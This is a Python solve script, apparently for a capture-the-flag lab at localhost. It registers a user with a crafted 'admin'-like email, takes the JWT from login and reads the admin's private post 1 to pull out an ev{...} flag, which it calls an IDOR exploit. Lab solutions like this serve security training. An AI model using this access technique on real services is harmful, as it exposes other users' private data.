import requests
import re

def solve():
    """
    This script exploits an Insecure Direct Object Reference (IDOR) vulnerability
    to access and retrieve a flag from an admin's private post.
    """
    base_url = "http://localhost:8080"
    s = requests.Session()

    # 1. Register a new user with a crafted email address
    print("Step 1: Registering a new user with email 'admin_hack-tron_ai'...")
    register_payload = {
        "email": "admin_hack-tron_ai",
        "password": "password"
    }
    try:
        register_response = s.post(f"{base_url}/api/auth/register", json=register_payload)
        print("Registration response:")
        print(register_response.text)
        register_response.raise_for_status()
        print("User registered successfully.")
    except requests.exceptions.RequestException as e:
        print(f"Error during registration: {e}")
        return

    # 2. Log in as the newly created user
    print("\\nStep 2: Logging in as the new user...")
    login_payload = {
        "email": "admin_hack-tron_ai",
        "password": "password"
    }
    try:
        login_response = s.post(f"{base_url}/api/auth/login", json=login_payload)
        print("Login response:")
        print(login_response.text)
        login_response.raise_for_status()
        print("Login successful.")
    except requests.exceptions.RequestException as e:
        print(f"Error during login: {e}")
        return

    # 3. Extract the JWT token from the login response
    try:
        token = login_response.json().get("token")
        if not token:
            print("Failed to extract JWT token from login response.")
            return
        print(f"\\nStep 3: Extracted JWT token: {token[:30]}...")
        # Set the Authorization header for subsequent requests
        s.headers.update({"Authorization": f"Bearer {token}"})
    except (ValueError, AttributeError):
        print("Could not parse login response or find token.")
        return

    # 4. Use the token to access the admin's private post (ID 1)
    print("\\nStep 4: Attempting to access admin's post at /api/posts/1...")
    try:
        post_response = s.get(f"{base_url}/api/posts/1")
        print("Post retrieval response:")
        print(post_response.text)
        post_response.raise_for_status()
        print("Successfully accessed admin's post.")
    except requests.exceptions.RequestException as e:
        print(f"Error retrieving post: {e}")
        return

    # 5. & 6. Extract and print the flag from the post content
    print("\\nStep 5 & 6: Searching for the flag in the response...")
    try:
        post_content = post_response.json().get("content", "")
        # The flag format is ev{...}
        flag_match = re.search(r"ev\\{.*?\\}", post_content)
        if flag_match:
            flag = flag_match.group(0)
            print(f"\\n*** Flag found! ***\\n{flag}")
        else:
            print("\\nFlag not found in the post content.")
    except (ValueError, AttributeError):
        print("Could not parse post response or find content field.")

if __name__ == "__main__":
    solve()